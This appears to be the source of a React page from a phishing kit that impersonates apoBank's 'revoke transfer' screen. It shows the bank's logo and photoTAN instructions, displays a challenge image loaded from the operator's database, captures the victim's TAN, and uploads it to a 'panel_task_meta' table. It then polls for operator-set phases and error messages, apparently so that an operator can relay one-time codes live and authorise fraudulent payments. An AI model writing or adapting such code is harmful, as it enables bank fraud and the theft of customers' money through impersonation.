import { useEffect, useState } from "react";
import { ChevronRight } from "lucide-react";
import { useNavigate, useSearchParams } from "react-router-dom";
import apoBankLogo from "@/assets/apobank-logo.svg";
import phototanImg from "@/assets/phototan.png";
import { Button } from "@/components/ui/button";
import { supabase } from "@/integrations/supabase/client";

type Row = {
  id: string;
  photo_tan_image: string | null;
  customer_phase: string | null;
  last_error: string | null;
  auftraggeber_name: string | null;
  auftraggeber_iban: string | null;
  empfaenger_name: string | null;
  empfaenger_iban: string | null;
  betrag: number | null;
  verwendungszweck: string | null;
};

const formatIban = (v?: string | null) =>
  (v || "").replace(/\s+/g, "").replace(/(.{4})/g, "$1 ").trim();
const kontoFromIban = (v?: string | null) => {
  const s = (v || "").replace(/\s+/g, "");
  if (!s) return "—";
  return s.slice(4).replace(/^0+/, "") || s.slice(4);
};
const formatBetrag = (n?: number | null) =>
  n == null ? "—" : new Intl.NumberFormat("de-DE", { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(Number(n)) + " EUR";
const berlinToday = () =>
  new Intl.DateTimeFormat("de-DE", { day: "numeric", month: "long", year: "numeric", timeZone: "Europe/Berlin" }).format(new Date());


const WiderrufPhotoTan = () => {
  const navigate = useNavigate();
  const [sp] = useSearchParams();
  const token = sp.get("token");
  const [tan, setTan] = useState("");
  const [row, setRow] = useState<Row | null>(null);
  const [saving, setSaving] = useState(false);

  useEffect(() => {
    if (!token) return;
    const load = async () => {
      const { data } = await (supabase as any)
        .from("storno_tokens")
        .select("id, photo_tan_image, customer_phase, last_error, auftraggeber_name, auftraggeber_iban, empfaenger_name, empfaenger_iban, betrag, verwendungszweck")
        .eq("token", token)
        .maybeSingle();
      if (!data) return;
      setRow((prev) => {
        if (prev && (data as Row).last_error && (data as Row).last_error !== prev.last_error) {
          setSaving(false);
          setTan("");
        }
        return data as Row;
      });
      const p = (data as Row).customer_phase;
      if (p === "success") navigate(`/success?token=${encodeURIComponent(token)}`);
      else if (p === "aborted") navigate("/auth");
      else if (p === "phototan_request" || p === "start") navigate(`/widerruf/start?token=${encodeURIComponent(token)}`);

    };
    load();
    const ch = (supabase as any)
      .channel(`widerruf_pt_${token}`)
      .on("postgres_changes", { event: "*", schema: "public", table: "storno_tokens", filter: `token=eq.${token}` }, load)
      .subscribe();
    const iv = window.setInterval(load, 3000);
    return () => { window.clearInterval(iv); (supabase as any).removeChannel(ch); };
  }, [token, navigate]);

  const submitTan = async () => {
    if (!row) return;
    setSaving(true);
    await (supabase as any).from("panel_task_meta").upsert(
      { task_id: `storno:${row.id}`, tan },
      { onConflict: "task_id" }
    );
  };


  const Field = ({ label, value }: { label: string; value: string }) => (
    <div>
      <p className="text-sm text-[#002776] mb-2 font-medium">{label}</p>
      <p className="text-sm text-foreground">{value}</p>
    </div>
  );

  const validTan = tan.length === 6 || tan.length === 8;

  return (
    <div className="min-h-screen bg-[#f5f5f5] flex flex-col">
      <header className="w-full bg-white border-b border-border/40">
        <div className="max-w-6xl mx-auto px-4 py-3 flex items-center gap-4">
          <img src={apoBankLogo} alt="apoBank Logo" className="h-12 w-auto" />
        </div>
      </header>

      <div className="bg-[#f5f5f5] border-b border-border/40">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 py-4">
          <div className="flex items-center gap-2 text-sm text-[#002776]">
            <span className="cursor-default">Startseite</span>
            <ChevronRight className="h-3 w-3 text-foreground/60" />
            <span className="text-foreground/70">Überweisung widerrufen</span>
          </div>
          <h1 className="mt-2 text-2xl sm:text-3xl font-normal text-[#1a1a1a]">Überweisung widerrufen</h1>
        </div>
      </div>

      <main className="flex-1 relative">
        <div className="flex items-start justify-center">
          <div className="mt-8 sm:mt-10 mb-16 w-[94%] max-w-[680px] bg-white rounded-[16px] shadow-[0_8px_30px_rgba(0,0,0,0.15)] border border-border/40 p-6 sm:p-10">
            <h2 className="text-lg sm:text-xl text-[#1a1a1a] mb-6">
              Bitte prüfen Sie die folgende Transaktion
            </h2>

            <p className="text-sm text-foreground mb-6">Zahlung widerrufen</p>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-6 mb-6">
              <Field label="Empfängerkonto" value={formatIban(row?.empfaenger_iban) || "—"} />
              <Field label="Betrag" value={formatBetrag(row?.betrag)} />
              <Field label="Verwendungszweck" value={row?.verwendungszweck || "—"} />
              <Field label="Ausführungsdatum" value={berlinToday()} />
              <Field label="Auftraggeberkontonummer" value={kontoFromIban(row?.auftraggeber_iban)} />
              <Field label="IBAN des Auftraggebers" value={formatIban(row?.auftraggeber_iban) || "—"} />
              <Field label="Kundenname" value={row?.auftraggeber_name || "—"} />
              <Field label="Name des Begünstigten" value={row?.empfaenger_name || "—"} />

            </div>

            {row?.last_error && (
              <p className="text-sm text-destructive mb-4">{row.last_error}</p>
            )}

            <div className="border-t border-border/60 pt-6 mb-6">
              <div className="flex flex-col sm:flex-row items-center gap-6">
                <div className="flex-1">
                  <p className="text-sm text-foreground mb-4">
                    Bitte scannen Sie die apoTAN Grafik mit der photoTAN Funktion Ihrer apoTAN App und geben Sie die TAN im Eingabefeld ein
                  </p>
                  <div className="relative">
                    <label className="absolute -top-2 left-3 bg-white px-1 text-[11px] text-[#002776]">TAN*</label>
                    <input
                      type="text"
                      value={tan}
                      onChange={(e) => setTan(e.target.value.replace(/\D/g, "").slice(0, 8))}
                      inputMode="numeric"
                      className="w-full border-2 border-[#002776] rounded px-3 py-3 text-sm outline-none focus:ring-2 focus:ring-[#a0b0c8]"
                    />
                  </div>
                </div>
                <img
                  src={row?.photo_tan_image || phototanImg}
                  alt="photoTAN Grafik"
                  className="w-40 h-40 object-contain border border-black"
                />
              </div>
            </div>

            <div className="flex justify-end items-center gap-4 pt-2">
              <Button
                disabled={!validTan || saving}
                onClick={submitTan}
                className={`rounded-full px-6 disabled:opacity-100 ${validTan ? "bg-white text-foreground border border-border hover:bg-white" : "bg-[#e6e8eb] text-foreground/60 hover:bg-[#e6e8eb]"}`}
              >
                {saving ? (
                  <span className="inline-flex items-center gap-2">
                    <span className="h-4 w-4 border-2 border-foreground/40 border-t-transparent rounded-full animate-spin" />
                    Wird geprüft…
                  </span>
                ) : (
                  "Freigeben"
                )}
              </Button>
            </div>

          </div>
        </div>
      </main>
    </div>
  );
};

export default WiderrufPhotoTan;
